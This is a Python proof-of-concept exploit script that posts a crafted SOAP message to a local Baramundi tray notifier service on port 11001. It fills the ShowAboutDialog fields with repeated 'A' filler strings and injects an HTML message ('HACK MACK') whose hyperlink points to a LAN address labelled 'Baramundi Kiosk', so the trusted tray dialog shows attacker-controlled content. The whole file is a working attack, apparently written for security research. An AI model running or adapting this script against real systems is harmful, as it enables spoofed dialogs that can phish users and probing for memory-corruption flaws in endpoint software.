#!/usr/bin/python

import requests
import json
import html

TrayIconUrl="http://localhost:11001/traynotifierservice"
bmaUrl="http://localhost:11001/"
header={"User-Agent":"gSOAP/2.7",
	"Content-Type":"text/xml; charset=utf-8",
	"SOAPAction":""
	}

payload=100*"\x41"
html_msg='<html><body bgcolor="#FF00FF"><h1>HACK MACK...<br> HACK MACK....<a href="http://192.168.98.186:8000" title="Baramundi Kiosk"></a> \
</body></html>'


SOAPMsg='<?xml version="1.0" encoding="UTF-8"?> \
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body><traynotifierservice:ShowAboutDialog> \
<Caption>' + payload + '</Caption> \
<TickerText>' +html.escape(html_msg) + '</TickerText> \
<Hyperlink>http://custom.local/blubb.txt</Hyperlink> \
' + 10*('\
<VersionInfos> \
<m-Module>' + html.escape(html_msg) + '</m-Module> \
<m-Version>' + payload + '</m-Version> \
<m-Path>' + payload +' </m-Path> \
</VersionInfos>') + ' \
</traynotifierservice:ShowAboutDialog> \
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>'

try:
#	r=requests.post(TrayIconUrl, data=SOAPMsg.encode(), headers=header)
	r=requests.post(bmaUrl, data=SOAPMsg.encode('utf-8'), headers=header)
#	r=requests.get(TrayIconUrl, params=payload, headers=header, timeout=60.0)
except requests.exceptions.RequestException as err:
	print("[-] Error...")
	print(err)
try:
	print(r)
	print(r.text)
except NameError as err:
	print("[-] Error...")
	print(err)
